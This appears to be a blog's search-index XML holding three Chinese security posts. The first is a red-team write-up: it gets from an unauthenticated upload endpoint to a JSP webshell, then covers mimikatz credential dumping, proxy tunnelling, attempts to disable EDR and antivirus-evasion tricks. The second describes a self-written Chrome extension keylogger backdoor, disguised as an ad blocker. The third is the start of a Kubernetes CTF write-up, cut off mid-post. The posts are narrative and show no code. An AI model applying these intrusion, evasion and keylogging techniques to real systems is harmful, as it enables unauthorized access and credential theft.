<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Redteam-从Getshell到束手无策</title>
      <link href="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/"/>
      <url>/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/</url>
      
        <content type="html"><![CDATA[<p>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近来北京出差搞攻击队</p><p>拿到目标的首个 shell 后准备搞内网，遇上edr拼尽全力无法战胜最终变成深信服大人的形状</p><p>“<em>不知道从哪雇的点鼠标的猴子，为了写这篇文章，我甚至从走了一遍流程来截图，依然能顺利getshell</em> “</p><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><h5 id="权限获取：从未授权到Getshell"><a href="#权限获取：从未授权到Getshell" class="headerlink" title="权限获取：从未授权到Getshell"></a>权限获取：从未授权到Getshell</h5><p>​也是伴随着不少时间的信息搜集找到了这个站</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/1.png" alt="image-20250610145003916"></p><p>​突破口是在f12从js下手</p><p>​<img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/2.png" alt="image-20250610145637518"></p><p>​大概简单看了一眼，app.js价值比较大，很多逻辑的实现都写在其中</p><p>​然后把它下载了下来，用之前写的js匹配工具匹配出了一些路径</p><p>​<img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/3.png" alt="image-20250610150344522"></p><p>​把路径放到字典里去burp探测了一手，看看有无未授权之类的</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/4.png" alt="image-20250610151315206"></p><p>工具基于正则去匹配，噪声肯定是很大的，需要考虑到一些前置路由和变量，然后又根据这些东西去搜具体代码实现 所以这些404也没有去追究</p><p>最终根据名字，留意到了<code>/ajaxUploadFile</code></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/5.png" alt="image-20250610151532970"></p><p>果然有一个Xa变量作为了前置路径</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/6.png" alt="image-20250610151637210"></p><p>发现了Xa值为<code>/1api</code></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/7.png" alt="image-20250610151728211"></p><p>把<code>/1api</code>拼接到<code>/ajaxUploadFile</code>前面去访问</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/8.png" alt="image-20250610151926918"></p><p>提示需要验证码，没有跟其他路径一样发生登录验证跳转这种</p><p>并且呢响应了<code>Access-Control-Allow-Origin: *</code>跨域限制也可以忽略</p><p>接下来就需要构思上传表单，因为要保证提交的表单字段与后端接口预期一致，再考虑验证码校验</p><p>我的思路：</p><ol><li>找目标业务上传功能点</li><li>从静态资源中反推</li></ol><p>第一种：有了表单一切都好说，只要获取到了上传表单，其中的 <code>name</code> 属性基本上已经是服务端接受的字段名，但这个首页需要登录才能访问业务，尝试了能想到的方法均不可，所以放弃</p><p>突破点在第二种，有些开发会通过js构建上传结构，这就不得不提到<code>FormData</code>对象，笔者学过一段时间js开发 常用这个搭配<code>XMLHttpRequest</code> 或 <code>fetch</code>处理文件上传</p><p>最终搜<code>.append(</code>找到了处理表单的具体实现</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/10.png" alt="image-20250610174157092"></p><p> 先实现，直接复制粘贴给GPT，让它分析并生成一个文件上传的页面</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/11.png" alt="image-20250610205501361"></p><p>  ai给出了上传的html</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/12.png" alt="image-20250610210222438"></p><p>上传抓包后发现校验验证码</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/13.png" alt="image-20250610210334613"></p><p>运气好+神人开发助力，往后翻又找到了上传逻辑</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/14.png" alt="image-20250610210540502"></p><p>前端校验文件后缀，外加硬编码，猜测这个<code>filekey</code>就是验证码</p><p>然后把之前生成的上传文件的html 加上这一串再做测试</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/15.png" alt="image-20250610210814398"></p><p>OK 图片可以成功上传</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/16.png" alt="image-20250610211205649"></p><p>这个时候并没有着急传webshell，首要目的是找到文件存储的位置，我能不能直接访问到</p><p>因为前面js信息搜集工具扫到了这个地址</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/17.png" alt="image-20250610213422958"></p><p>拼接尝试之后确认图片存储路径</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/18.png" alt="image-20250610213911473"></p><p>还好不是OSS，或者说分离存储那种 不然寄了</p><p>后面依次测试</p><ol><li><p>图片内容不变，后缀改为jsp，验证是否有后缀检测-&gt;<strong>成功</strong></p></li><li><p>修改图片内容 添加java代码打印hello，判断目录是否解析jsp-&gt;<strong>成功</strong></p></li><li><p>传一个接受参数当命令执行的jsp且混淆一下，不符合常见webshell，规避检测，看能否执行命令-&gt; <strong>成功</strong></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/19.png" alt="image-20250610215554874"></p></li><li><p>上传webshell，冰蝎、几个免杀的webshell、要么无法上传，要么传上无法连接，最终哥斯拉马上传连接-&gt;<strong>成功</strong></p></li></ol><p>​ <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/20.png" alt="image-20250610215836071"></p><p>这里原本想的是打内存马，但是考虑到目标是jboss，我对jboss内存马并不了解</p><p>并且客户强调禁止做影响业务的操作，内存马的剔除有时会搞崩业务，就准备用webshell继续</p><h5 id="内网渗透：“孤儿机”-EDR"><a href="#内网渗透：“孤儿机”-EDR" class="headerlink" title="内网渗透：“孤儿机”+EDR"></a>内网渗透：“孤儿机”+EDR</h5><p>依旧不出网这一块.&#x2F;，找不到出网协议这一块</p><p>先是看了查了下进程</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/21.png" alt="image-20250611095153125"></p><p>四个杀软 六百六十六</p><p>判断下不是云上环境</p><p>看了眼也没域，这种的话搞不了域渗透，很多姿势都废掉了</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/22.png" alt="image-20250611102641665"></p><p> 直接上免杀mimikatz提凭据连RDP进去把杀软能退的退掉，翻一翻文件，webshell操作太慢动静太大，再传工具信息搜集</p><p>  <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/23.png" alt="image-20250611102909896"></p><p>  得到ntlm</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/24.png" alt="image-20250611103139079"></p><p> 得到明文</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/25.png" alt="image-20250611103203188"></p><p>文件上传的地方suo5代理传上去</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/26.png" alt="image-20250611103726937"></p><p> 配置好隧道</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/27.png" alt="image-20250611103927267"></p><p>连接</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/28.png" alt="image-20250611103957431"></p><p>这个瞬间，先是加载了桌面，过了一会才出的这个验证，猜测应该是对行为的检测</p><p>后面找师傅问了下怎么把这个退掉，过程中没有截图，大概是提权删<code>C:/Program Files/Sangfor/EDR/agent/bin/sfrdpverify.exe</code>，或者加载驱动退掉，我对这一块也不太懂，试了几个方法和大佬给的<code>exe</code>后面统统失败</p><p>这条路堵死了</p><p>后面的想法是找找集群设备进行漏洞利用，这样也能拿下大把机器，前面有从其他业务注入拿到了不少账号密码</p><p>那就需要做信息搜集</p><p>先把所有可能通的网段找出来</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/29.png" alt="image-20250611110528238"></p><p> 已知本机的ip段是<code>192.168.196.1/24</code></p><p>  <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/30.png" alt="image-20250611110853090"></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/31.png" alt="image-20250611110907267"></p><p>还有<code>224.0.0.1/24</code></p><p>再把<code>netspy</code>免杀下 传上去扫一下可达网段</p><p>最终也是找免杀大佬F_Dao免杀多次才上传成功</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/32.png" alt="img"></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/33.png" alt="img"></p><p>EDR再次发力，扫着扫着就会把进程关掉，导致最后只得到了两个网段</p><p>  <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/34.png" alt="img"></p><p> 那目前就已知<code>192.168.196.1/24</code>、<code>192.168.10.1/24</code>、<code>224.0.0.1/24</code>这三个段</p><p> 继续本地工具走代理去扫，不然用什么传什么动静太大，每一个都要免杀耗时耗力</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/35.png" alt="image-20250611113318119"></p><p>最后挂本地代理用了几个扫描工具，啥几把也扫不出来，就留了这一个fscan的截图</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/36.png" alt="image-20250611115501103"></p><p>这个时候需要禁ping扫描，因为socks5代理属于传输层，fscan默认先ping，ping走的icmp属于网络层，这样会导致不通</p><p>除了目标机器的网段没扫，这俩个网段均无任何发现</p><p>后面把工具免杀传到机器上</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/37.png" alt="image-20250611153144611"></p><p>这个时候有一个技巧，杀软有概率检测落地文件后缀，把二进制文件改成txt后缀，其实依然可以在cmd中运行</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/38.png" alt="image-20250611153331046"></p><p> 这里在机器本地扫本机IP段，也是没啥重要的发现</p><p> <strong>其实这里做了很多操作，上了很多工具和命令，都没有截图 确实没什么有用的东西</strong></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/39.png" alt="image-20250611153551586"></p><p>让浏览器走socks5代理后访问这几个url，跑了下指纹测了测业务， jboss漏洞跑了也没结果</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/40.png" alt="image-20250611154224872"></p><p> 没截图</p><p> 然后又搜集了一波信息</p><p> 无任何有效发现，更别说堡垒机天擎vcenter什么的这种集群管理的业务了</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/41.png" alt="img"></p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/42.png" alt="img"></p><p> 可以看到连接也是空空如也，我已经想不到其他办法了</p><p> 至于他不出网，可能是交换机做的映射，并且http icmp dns完全不通</p><p> 后面翻到两个orcale数据库账号密码 以及 <code>192.168.1</code>这个c段</p><p> 想着连数据库找首页的登录账号，但…</p><p> c段直接不通</p><p> 外加这些注释掉了，猜测也是不用了，最后用这个数据库的账号密码碰撞了一下首页的登录 也是失败</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/43.png" alt="image-20250611160859277"></p><p>接着想上线cs，其实代理成功进去已经没上cs的必要了，当时想着破罐子破摔 插件全点一遍梭哈结束</p><p>因为目标不出网，所以用自己电脑当跳板：</p><p>我的电脑先反向连接上cs，再传一个正向连接的马到目标机运行，本机cs马走socks5代理，然后cs里面conncet去连接</p><p> <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/44.png" alt="img"></p><p>做了免杀后成功落地并运行</p><p>  <img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/45.png" alt="image-20250611163317758"></p><p> 依旧连不上，猜测可能是<strong>端口白名单</strong>，换了几个常用端口 统统不行，大概率是edr的行为防护</p><p> 如果没有edr 连上RDP或许还有更多可能</p><p> 没有域 没有集群管理设备 没有其他网段 不出网 各大杀软，内网渗透就结束了</p><h5 id="水坑收尾"><a href="#水坑收尾" class="headerlink" title="水坑收尾"></a>水坑收尾</h5><p>这块是同事大佬实现的</p><p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/46.png" alt="image-20250611170208614"></p><p>​ 等待有缘人</p><img src="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/47.png" alt="image-20250611165907429" style="zoom:200%;"><p>截止项目结束都没有人上钩… </p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4><p>燃尽 这种内网环境不知道大家有什么思路</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Chrome扩展插件的后门技术实现</title>
      <link href="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基于Chrome扩展插件的后门技术实现"><a href="#基于Chrome扩展插件的后门技术实现" class="headerlink" title="基于Chrome扩展插件的后门技术实现"></a>基于Chrome扩展插件的后门技术实现</h2><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​起因是最近对钓鱼比较感兴趣，恰好又关注到了将军手下黑客盗ETH这件事，一股邪念涌出但是我压制回去了。想到自己也搞一个钓鱼，留着打攻防的时候看看能不能用上，思来想去夜不能寐想到了一个场景：</p><p>​通过钓鱼，或者漏洞利用，拿下了一台员工的机器，根据Chrome当前的市场占比以及实际情况，如果有WEB业务需要使用，几乎百分之99的人都会有。比如说OA，VPN，堡垒机，各种安全设备的面板等等等，它百分之99用的是Chrome浏览器。这样我搞一个恶意的插件加载进去，<strong>实现键盘记录或者搜集一些信息搞点钓鱼什么的</strong>，之后它就诞生了，我给他取名为：fkc(FuckChrome)</p><p>​Github:<a href="https://github.com/Seven1an/fkc">https://github.com/Seven1an/fkc</a></p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>​原理：</p><p>​1.通过终端启动chrome并加载恶意插件</p><p>​2.插件将用户的请求以及按键情况，发送到监听服务</p><p>​3.监听的服务再将发来的内容写入到文件中保存</p><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><p>​使用cs进行演示来更贴近实际情况</p><p>​这里我已经写好了chrome插件</p><p> <img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/1.png" alt="image-20250226105256633"></p><p>​监听服务我使用go来实现的，刚开始用的php，后面考虑到实际实践情况可能会很麻烦，感觉一劳永逸得了</p><p> <img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/2.png" alt="image-20250226105813347"></p><p>不管是插件还是监听端，代码量都不是很多，因为我目前实现的功能很少，仅有<strong>键盘记录</strong>+<strong>请求获取</strong>这两个功能，我想测试几个实际场景后再考虑是否继续深入研究，所以欢迎一起交流的师傅！</p><h6 id="一、加载插件"><a href="#一、加载插件" class="headerlink" title="一、加载插件"></a>一、加载插件</h6><p>​这里我已经将其上线到cs<img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/3.png" alt="image-20250226110257177"></p><p>​众所周知Chrome安装的时候是不能自定义安装路径的，这也方便了我们攻击者确定他在哪</p><p>​<img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/4.png" alt="image-20250226110502848"></p><p>​确认到Chrome的绝对路径</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/5.png" alt="image-20250226110640234"></p><p>​通过Google的技术支持回复得知，可以通过<code>--load-extension=&lt;path-to-extension-folder&gt;</code>来加载插件启动Chrome</p><p> link：<a href="https://support.google.com/chrome/thread/205881926/it-s-possible-to-load-unpacked-extension-automatically-in-chrome?hl=en">https://support.google.com/chrome/thread/205881926/it-s-possible-to-load-unpacked-extension-automatically-in-chrome?hl=en</a></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/6.png" alt="image-20250226111021911"></p><p>​再加载启动之前，查看浏览器确实没有任何插件</p><p>​<img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/7.png" alt="image-20250226111143916"></p><p>先把插件传上去</p><p> <img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/8.png" alt="image-20250226111428160"></p><p>加载启动</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/9.png" alt="image-20250226111922128"></p><p>这个时候打开受害机，已经确认后门插件进行了添加</p><p> <img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/10.png" alt="image-20250226112021339"></p><p>当然为了伪装，可以把他改一下名字 换个头像之类的，比如说 什么什么广告拦截助手，网页清理大师，xx集团认证插件之类的</p><h6 id="二、启动监听"><a href="#二、启动监听" class="headerlink" title="二、启动监听"></a>二、启动监听</h6><p>​把编译好的exe放上去</p><p>​<img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/11.png" alt="image-20250226112303222"></p><p> <strong>-p 指定监听端口，这个端口要和插件中的通信保持一致</strong>，如果放在外网ip也要改，这个就不演示了，因为我也没做测试</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/12.png" alt="image-20250226112654519"></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/13.png" alt="image-20250226112732741"></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/14.png" alt="image-20250226112759628"></p><p>为了更是实用，程序运行没有遗留窗口，完全静默在后台</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/15.png" alt="image-20250226113102619"></p><h6 id="三、结果呈现"><a href="#三、结果呈现" class="headerlink" title="三、结果呈现"></a>三、结果呈现</h6><p>​这个时候，<strong>假装我是受害者</strong>，我现在需要登录堡垒机看一下日志</p><p>​<img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/16.png" alt="image-20250226113307850"></p><p> 然后我现在是攻击者，在cs中找到临时目录，也就是<code>C:\Users\&lt;当前用户名&gt;\AppData\Local</code>，可以看到多了两个文件，<code>key_press.txt</code>和<code>request_log.txt</code></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/17.png" alt="image-20250226113446315"></p><p>其实这里监听端也可以开在远程，但是考虑到了机器不出网的情况，所以本地这个目录稳妥一些</p><p>下载下来查看</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/18.png" alt="image-20250226113606651"></p><p><strong>在request_log中，可以获得受害者访问的url信息</strong></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/19.png" alt="image-20250226113859629"></p><p><strong>在key_press中，可以得到受害者键盘输入信息</strong></p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/20.png" alt="image-20250226114149925"></p><p>这里就可以得到信息，</p><p>​受害者访问的路径是 <a href="http://192.168.100.11:8080/zg/v2/index/ROOT/login.jsp%EF%BC%8C">http://192.168.100.11:8080/zg/v2/index/ROOT/login.jsp，</a></p><p>​还不是开在当前机器的，我用了一台Centos开的WEB</p><p> <img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/22.png" alt="image-20250226114838966"></p><p>​受害者输入的账号密码是：<strong>admin&#x2F;Pzgjsaa1.</strong></p><p>​这个时候改一下type去验证与实际是否准确</p><p><img src="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/img/21.png" alt="image-20250226114532894"></p><p>完全准确，效果还可以</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4><p>js能干的事情太多太多了，更多姿势有待开发！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WIZ K8S LAN Party Writeup</title>
      <link href="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/"/>
      <url>/2025/01/07/WIZ-K8S-LAN-Party-Writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="WIZ-K8S-LAN-Party-Writeup"><a href="#WIZ-K8S-LAN-Party-Writeup" class="headerlink" title="WIZ K8S LAN Party Writeup"></a>WIZ K8S LAN Party Writeup</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​Kubernetes CTF靶场，记录一下解题过程</p><p>​<strong>Link:</strong><a href="https://www.k8slanparty.com/">https://www.k8slanparty.com/</a></p><p>​“Welcome to the Kubernetes LAN Party! A CTF designed to challenge your Kubernetes hacking skills through a series of critical network vulnerabilities and misconfigurations. Challenge yourself, boost your skills, and stay ahead in the cloud security game.”</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/1.png" alt="image-20250107103022303"></p><h3 id="START"><a href="#START" class="headerlink" title="START"></a>START</h3><h4 id="1-RECON"><a href="#1-RECON" class="headerlink" title="1.RECON"></a>1.RECON</h4><p>Description</p><p><em>You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.</em></p><p><em>As a warmup, utilize <a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have “loaded your machine with <a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan</a> to ease this process for further challenges.</em></p><p><em>All the flags in the challenge follow the same format: wiz_k8s_lan_party{</em>}</p><p>提供了两个链接</p><p>以及，”loaded your machine with [dnscan]”</p><p>点进去第一个链接开头就表达了</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/2.png" 